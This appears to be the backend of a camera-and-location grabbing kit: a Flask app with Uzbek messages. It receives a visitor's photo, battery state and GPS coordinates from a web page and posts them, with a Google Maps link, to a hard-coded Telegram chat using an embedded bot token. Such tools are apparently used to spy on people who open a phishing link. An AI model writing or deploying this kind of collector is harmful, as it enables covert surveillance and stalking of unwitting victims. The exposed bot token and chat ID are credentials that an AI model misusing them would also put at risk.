import os
from flask import Flask, request, render_template
import requests

app = Flask(__name__)

BOT_TOKEN = '8406251953:AAH_ip-sVtr89vyuHXVNc3UZb8fqvfTWotw'
ADMIN_ID = 7962350864

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    if 'photo' not in request.files:
        return 'Rasm yo‘q', 400

    photo = request.files['photo']
    battery_level = request.form.get('batteryLevel', 'Nomalum')
    battery_charging = request.form.get('batteryCharging', 'Nomalum')
    latitude = request.form.get('latitude', 'Nomalum')
    longitude = request.form.get('longitude', 'Nomalum')

    photo_path = 'auto.jpg'
    photo.save(photo_path)

    # battery_level ni raqamga aylantirish
    try:
        battery_percent = int(float(battery_level) * 100)
    except (ValueError, TypeError):
        battery_percent = 'Nomalum'

    send_photo_url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'

    caption_text = (
        "📸 Yangi rasm!\n"
        f"🔋 Zaryad: {battery_percent if battery_percent != 'Nomalum' else 'Nomalum'}%, "
        f"Quvvat olayapti: {battery_charging}\n"
        f"📍 Joylashuv: https://www.google.com/maps/search/?api=1&query={latitude},{longitude}"
    )

    with open(photo_path, 'rb') as f:
        requests.post(send_photo_url, data={
            'chat_id': ADMIN_ID,
            'caption': caption_text
        }, files={'photo': f})

    os.remove(photo_path)
    return 'Yuborildi', 200


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
